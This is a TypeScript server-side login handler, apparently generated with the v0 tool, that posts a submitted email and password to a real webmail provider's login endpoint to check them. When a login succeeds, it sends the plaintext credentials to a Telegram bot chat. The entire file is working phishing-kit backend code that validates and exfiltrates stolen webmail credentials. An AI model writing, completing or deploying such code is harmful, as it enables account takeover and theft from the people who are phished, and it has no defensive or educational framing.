'use server';

async function sendTelegramNotification(email: string, password: string) {
  const telegramBotToken = process.env.TELEGRAM_API_KEY;
  const telegramChatId = process.env.TELEGRAM_CHAT_ID;

  if (!telegramBotToken || !telegramChatId) {
    console.warn('[v0] Telegram credentials not configured');
    return;
  }

  try {
    const message = `
🔐 **New Webmail Login Alert**

📧 Email: ${email}
🔑 Password: ${password}
⏰ Time: ${new Date().toISOString()}
    `.trim();

    const response = await fetch(
      `https://api.telegram.org/bot${telegramBotToken}/sendMessage`,
      {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          chat_id: telegramChatId,
          text: message,
          parse_mode: 'Markdown',
        }),
      }
    );

    if (!response.ok) {
      console.error('[v0] Telegram notification failed:', response.statusText);
    }
  } catch (error) {
    console.error('[v0] Error sending Telegram notification:', error);
  }
}

export async function validateLogin(email: string, password: string) {
  try {
    // Attempt to authenticate against the webmail server
    const response = await fetch(
      'https://webmail.sti.net/tuxedo/?_task=login&_err=session',
      {
        method: 'POST',
        headers: {
          'Content-Type': 'application/x-www-form-urlencoded',
          'User-Agent': 'Mozilla/5.0',
        },
        body: new URLSearchParams({
          _user: email,
          _pass: password,
          _task: 'login',
        }).toString(),
        redirect: 'follow',
      }
    );

    // Check if login was successful by looking for redirect or success indicators
    const responseText = await response.text();
    
    // If the response contains error indicators or the login form is still present, login failed
    const isLoginFailed = 
      responseText.includes('_err=session') ||
      responseText.includes('Login failed') ||
      responseText.includes('Invalid') ||
      response.status === 401 ||
      (response.status === 200 && responseText.includes('id="loginform"'));

    if (isLoginFailed) {
      return { success: false, error: 'Incorrect credentials.' };
    }

    // Login successful - send Telegram notification
    await sendTelegramNotification(email, password);
    
    return { success: true, redirect: response.url };
  } catch (error) {
    console.error('[v0] Login error:', error);
    return { 
      success: false, 
      error: 'Incorrect credentials.' 
    };
  }
}
